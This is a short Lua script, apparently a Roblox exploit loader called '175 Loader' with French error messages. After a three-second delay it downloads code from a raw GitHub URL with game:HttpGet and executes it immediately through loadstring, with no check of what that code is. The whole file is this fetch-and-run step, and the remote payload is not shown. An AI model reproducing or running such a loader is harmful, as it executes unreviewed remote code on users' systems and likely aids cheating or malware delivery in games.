task.wait(3)

local ok, err = pcall(function()
    local ls = loadstring or load
    local http = game.HttpGet or game.HttpGetAsync
    if not ls or not http then
        error("loadstring ou HttpGet est nil")
    end
    ls(http(game, "https://raw.githubusercontent.com/Pjdojefoejhfuh/ad/refs/heads/main/rejoni%20flash"))()
end)

if not ok then
    warn("[175 Loader] Erreur :", tostring(err))
end
